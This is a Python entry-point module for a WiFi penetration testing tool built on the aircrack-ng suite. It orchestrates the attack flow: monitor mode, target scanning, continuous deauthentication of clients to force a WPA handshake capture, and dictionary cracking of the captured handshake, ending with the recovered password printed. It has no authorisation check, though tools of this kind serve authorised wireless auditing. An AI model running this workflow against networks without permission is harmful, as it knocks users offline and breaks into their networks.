#!/usr/bin/env python3
"""
Main Module for WiFi Penetration Tool

This module orchestrates all components of the penetration testing utility:
- Interface management
- Network scanning
- Handshake capturing
- Client deauthentication
- Password cracking
- Fern-wifi-cracker integration

Usage:
    python3 main.py [options]
"""

import argparse
import sys
import os
import time
import signal
import subprocess
from typing import Optional

# Import our modules
from wifi_penetration_tool.interface_manager import InterfaceManager
from wifi_penetration_tool.scanner import NetworkScanner, NetworkTarget
from wifi_penetration_tool.sniffer import HandshakeSniffer
from wifi_penetration_tool.deauther import Deauthenticator
from wifi_penetration_tool.cracker import PasswordCracker, CrackResult
from wifi_penetration_tool.fern_integration import FernIntegration


class WiFiPenTestTool:
    """Main class that orchestrates the WiFi penetration testing workflow."""

    def __init__(self):
        """Initialize the WiFiPenTestTool."""
        self.interface_manager = InterfaceManager()
        self.scanner: Optional[NetworkScanner] = None
        self.sniffer: Optional[HandshakeSniffer] = None
        self.deauther: Optional[Deauthenticator] = None
        self.cracker = PasswordCracker()
        self.fern_integration = FernIntegration()
        self.args = None
        
        # Register signal handler for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, sig, frame):
        """Handle interrupt signals for graceful shutdown."""
        print("\n\n[!] Received interrupt signal. Cleaning up...")
        self._cleanup()
        print("[*] Cleanup completed. Exiting.")
        sys.exit(0)

    def _cleanup(self):
        """Clean up resources and restore system state."""
        # Stop any ongoing processes
        if self.sniffer and self.sniffer.is_capturing:
            self.sniffer.stop_capture()
            
        if self.deauther:
            self.deauther.stop_all_deauth()
            
        # Restore network interfaces
        self.interface_manager.restore_original_state()

    def _validate_environment(self) -> bool:
        """
        Validate the execution environment.
        
        Returns:
            bool: True if environment is valid, False otherwise
        """
        # Check for root privileges
        if not self.interface_manager.check_root_privileges():
            print("[-] This tool requires root privileges to run.")
            return False
            
        # Check for required tools
        required_tools = ['airodump-ng', 'aireplay-ng', 'aircrack-ng', 'iw', 'macchanger']
        for tool in required_tools:
            if not self._is_tool_installed(tool):
                print(f"[-] Required tool '{tool}' not found. Please install aircrack-ng suite.")
                return False
                
        # Check for fern-wifi-cracker
        if not self.fern_integration.is_fern_available():
            print("[!] fern-wifi-cracker is not available. Some features may be limited.")
                
        return True

    def _is_tool_installed(self, tool_name: str) -> bool:
        """
        Check if a tool is installed and available in PATH.
        
        Args:
            tool_name (str): Name of the tool to check
            
        Returns:
            bool: True if tool is installed, False otherwise
        """
        try:
            subprocess.run(['which', tool_name], 
                         capture_output=True, check=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False

    def _auto_detect_interface(self) -> Optional[str]:
        """
        Automatically detect a suitable wireless interface.
        
        Returns:
            Optional[str]: Interface name or None if not found
        """
        interfaces = self.interface_manager.detect_wireless_interfaces()
        if not interfaces:
            return None
            
        # Prefer interfaces that support monitor mode
        for interface in interfaces:
            if self.interface_manager.is_monitor_mode_supported(interface):
                return interface
                
        # If none support monitor mode, return the first one
        return interfaces[0] if interfaces else None

    def _setup_monitor_interface(self, interface: str) -> bool:
        """
        Set up the specified interface in monitor mode.
        
        Args:
            interface (str): Interface to set up
            
        Returns:
            bool: True if successful, False otherwise
        """
        print(f"[*] Setting up {interface} for monitoring...")
        
        # Check if already in monitor mode
        # For simplicity, we'll just try to enable it
        if self.interface_manager.enable_monitor_mode(interface):
            print(f"[+] Successfully put {interface} in monitor mode")
            return True
        else:
            print(f"[-] Failed to put {interface} in monitor mode")
            return False

    def _run_scanner_phase(self) -> Optional[NetworkTarget]:
        """
        Run the network scanning phase.
        
        Returns:
            Optional[NetworkTarget]: Selected target or None if cancelled
        """
        print("[*] Starting network discovery scan...")
        if self.args is None:
            return None
        self.scanner = NetworkScanner(self.args.interface)
        
        output_base = self.args.output_filename or "wifi_scan" if self.args else "wifi_scan"
        if not self.scanner.start_scan(output_base):
            print("[-] Failed to start network scan")
            return None
            
        # Parse results
        csv_file = f"{output_base}-01.csv"
        targets = self.scanner.parse_csv_output(csv_file)
        
        if not targets:
            print("[-] No networks found during scan")
            return None
            
        # Let user select target
        print(f"[+] Found {len(targets)} networks")
        return self.scanner.select_target_interactively(targets)

    def _run_capture_phase(self, target: NetworkTarget) -> bool:
        """
        Run the handshake capture phase.
        
        Args:
            target (NetworkTarget): Target network to capture
            
        Returns:
            bool: True if handshake captured, False otherwise
        """
        print(f"[*] Starting handshake capture for {target.essid} ({target.bssid})")
        
        output_base = self.args.output_filename or f"{target.essid}_capture" if self.args else f"{target.essid}_capture"
        if self.args is None:
            return False
        self.sniffer = HandshakeSniffer(self.args.interface)
        
        if not self.sniffer.start_capture(target.bssid, target.channel, output_base):
            print("[-] Failed to start packet capture")
            return False
            
        # Start monitoring for handshake
        self.sniffer.monitor_handshake()
        
        # Start deauthentication in background
        print("[*] Starting deauthentication attacks to capture handshake...")
        self.deauther = Deauthenticator(self.args.interface)
        self.deauther.send_continuous_deauth(target.bssid)
        
        # Wait for handshake or timeout
        timeout = 60  # 60 seconds
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if self.sniffer.check_handshake_status():
                print("[+] Handshake captured!")
                self.sniffer.stop_capture()
                self.deauther.stop_all_deauth()
                return True
            time.sleep(2)
            
        # Timeout reached
        print("[-] Timeout reached without capturing handshake")
        self.sniffer.stop_capture()
        self.deauther.stop_all_deauth()
        return False

    def _run_cracking_phase(self, capture_file: str) -> CrackResult:
        """
        Run the password cracking phase.
        
        Args:
            capture_file (str): Path to the capture file with handshake
            
        Returns:
            CrackResult: Result of the cracking attempt
        """
        print(f"[*] Starting password cracking on {capture_file}")
        dictionary_path = self.args.dictionary if self.args else '/usr/share/wordlists/rockyou.txt'
        print(f"[*] Using wordlist: {dictionary_path}")
        
        # Check handshake quality first
        has_handshake, quality = self.cracker.check_handshake_quality(capture_file)
        if not has_handshake:
            print("[-] No valid handshake found in capture file")
            return CrackResult(success=False)
            
        print(f"[+] Handshake quality: {quality}")
        
        # Perform cracking
        result = self.cracker.crack_handshake(capture_file, dictionary_path)
        return result

    def run(self) -> int:
        """
        Run the main penetration testing workflow.
        
        Returns:
            int: Exit code (0 for success, non-zero for error)
        """
        # Parse command line arguments
        parser = argparse.ArgumentParser(description="WiFi Penetration Testing Tool")
        parser.add_argument('-i', '--interface', 
                          help='Monitor-mode enabled NIC (default: auto-detect)')
        parser.add_argument('-t', '--target-bssid',
                          help='Skip scanner phase (optional fast entry)')
        parser.add_argument('-c', '--channel',
                          help='Channel for target (required with --target-bssid)')
        parser.add_argument('-d', '--dictionary', default='/usr/share/wordlists/rockyou.txt',
                          help='Set custom wordlist path (default: rockyou.txt)')
        parser.add_argument('-o', '--output-filename',
                          help='Base name for cap/dump/log storage')
        parser.add_argument('--use-fern', action='store_true',
                          help='Use fern-wifi-cracker for scanning and attacks')
        
        self.args = parser.parse_args()
        
        # Validate environment
        if not self._validate_environment():
            return 1
            
        # If --use-fern flag is set, use fern-wifi-cracker
        if self.args.use_fern and self.fern_integration.is_fern_available():
            print("[*] Using fern-wifi-cracker for operations")
            return self._run_with_fern()
            
        # Determine interface to use
        if not self.args.interface:
            self.args.interface = self._auto_detect_interface()
            if not self.args.interface:
                print("[-] No wireless interfaces found")
                return 1
            print(f"[*] Auto-detected interface: {self.args.interface}")
        else:
            print(f"[*] Using specified interface: {self.args.interface}")
            
        # Set up monitor mode
        if not self._setup_monitor_interface(self.args.interface):
            return 1
            
        target = None
        
        # Skip scanner if target BSSID provided
        if self.args.target_bssid:
            if not self.args.channel:
                print("[-] Channel is required when specifying target BSSID")
                self._cleanup()
                return 1
                
            # Create a target object manually
            target = NetworkTarget(
                bssid=self.args.target_bssid,
                essid="Unknown",
                channel=self.args.channel,
                encryption="WPA/WPA2",
                power="Unknown",
                clients=[]
            )
            print(f"[*] Using target: {target.bssid} on channel {target.channel}")
        else:
            # Run scanner phase
            target = self._run_scanner_phase()
            if not target:
                self._cleanup()
                return 1
                
        # Run capture phase
        if not self._run_capture_phase(target):
            print("[-] Failed to capture handshake")
            self._cleanup()
            return 1
            
        # Get capture file path
        capture_file = self.sniffer.get_capture_file() if self.sniffer else ""
        if not capture_file or not os.path.exists(capture_file):
            print("[-] Capture file not found")
            self._cleanup()
            return 1
            
        # Run cracking phase
        result = self._run_cracking_phase(capture_file)
        
        # Display results
        print("\n" + "="*50)
        print("CRACKING RESULTS")
        print("="*50)
        
        if result.success:
            print(f"[+] PASSWORD CRACKED: {result.password}")
        else:
            print("[-] Password not found in wordlist")
            
        print(f"Keys tested: {result.keys_tested}")
        print("="*50)
        
        # Cleanup
        self._cleanup()
        return 0

    def _run_with_fern(self) -> int:
        """
        Run the penetration testing workflow using fern-wifi-cracker.
        
        Returns:
            int: Exit code (0 for success, non-zero for error)
        """
        print("[*] Starting penetration test with fern-wifi-cracker")
        
        # Determine interface to use
        interface = self.args.interface if self.args else None
        if not interface:
            interface = self._auto_detect_interface()
            if not interface:
                print("[-] No wireless interfaces found")
                return 1
            print(f"[*] Auto-detected interface: {interface}")
        else:
            print(f"[*] Using specified interface: {interface}")
            
        # Run fern scan
        print("[*] Running network scan with fern-wifi-cracker...")
        scan_output = self.fern_integration.run_fern_scan(interface)
        if not scan_output:
            print("[-] Failed to run fern scan")
            return 1
            
        print("[+] Scan completed successfully")
        print("Scan results:")
        print(scan_output)
        
        # For demo purposes, we'll just show the scan results
        # In a real implementation, you would parse the results and continue
        print("[*] To continue with attacks, run without --use-fern flag")
        return 0


def main():
    """Main entry point for the application."""
    tool = WiFiPenTestTool()
    exit_code = tool.run()
    sys.exit(exit_code)


if __name__ == "__main__":
    main()